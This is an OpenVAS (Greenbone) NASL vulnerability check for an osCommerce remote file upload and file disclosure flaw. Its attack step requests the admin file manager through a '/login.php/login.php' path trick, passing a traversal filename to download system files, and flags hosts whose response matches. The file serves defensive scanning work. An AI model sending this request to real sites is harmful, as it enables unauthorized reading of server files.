###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oscommerce_50301.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# osCommerce Remote File Upload and File Disclosure Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "osCommerce is prone to a remote file upload and a file disclosure
vulnerability. The issues occur because the application fails to
adequately sanitize user-supplied input.

An attacker can exploit these issues to upload a file and obtain an
arbitrary file's content; other attacks are also possible.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103309");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-10-24 14:18:38 +0200 (Mon, 24 Oct 2011)");
 script_bugtraq_id(50301);
 script_tag(name:"cvss_base", value:"4.6");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");

 script_name("osCommerce Remote File Upload and File Disclosure Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50301");
 script_xref(name : "URL" , value : "http://www.oscommerce.com/solutions/downloads");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("oscommerce_detect.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("Software/osCommerce");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
CPE = 'cpe:/a:oscommerce:oscommerce';

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

files = traversal_files();

foreach file (keys(files)) {
   
  url = string(dir, "/admin/shop_file_manager.php/login.php/login.php?action=download&filename=/",files[file],"&path_id=/",files[file]); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
    report = report_vuln_url( port:port, url:url ); 
    security_message(port:port, data:report);
    exit(0);

  }
}

exit(0);
